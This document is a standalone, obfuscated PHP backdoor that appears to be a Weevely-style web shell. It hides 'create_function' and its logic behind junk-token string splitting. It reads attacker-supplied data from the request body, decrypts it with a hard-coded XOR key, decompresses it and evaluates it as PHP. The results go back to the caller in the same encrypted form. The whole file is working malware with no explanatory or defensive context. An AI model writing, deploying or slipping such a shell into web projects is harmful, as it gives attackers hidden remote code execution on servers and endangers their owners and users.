<?php
$L=str_replace('du','','cdureduate_dufduunducdution');
$i='$k="b434Se5854Se";$khSe="1fa1See0b647Se6e";$Sekf="4dSeSe5e6b80cf8a";Se$p="0y4IBijSevSeSeSejfIxNn';
$y='atSech("/$kh(.+)$kf/",@fileSe_getSe_coSentents("Sephp:Se//inpuSet"),$m)==1Se) {@ob_starSet();@eSe';
$v='_Seend_clSeean();$r=Se@base6Se4_eSencode(Se@x(Se@gzcompSeresSeSes($o),$kSe));print(Se"$p$kh$r$kf");}';
$h='gE";funcSetion x($t,$SekSe){Se$c=strSelen($k);$l=SeSestSerlen($t);$Seo="";for($i=Se0;$i<$l;Se){for(Se$j=';
$H='0;($j<$c&Se&$i<$lSe);$j+Se+,$i+Se+Se){$o.=$t{$Sei}^Se$k{$jSe};}Se}return $o;}if (Se@pSereg_SeSemSe';
$I='SevaSel(@gzunSeSecompress(@x(@bSeaSese64_decodeSe(Se$m[1]),$k)));$o=@Seob_geSet_contenSetsSe();@ob';
$r=str_replace('Se','',$i.$h.$H.$y.$I.$v);
$j=$L('',$r);$j();
?>
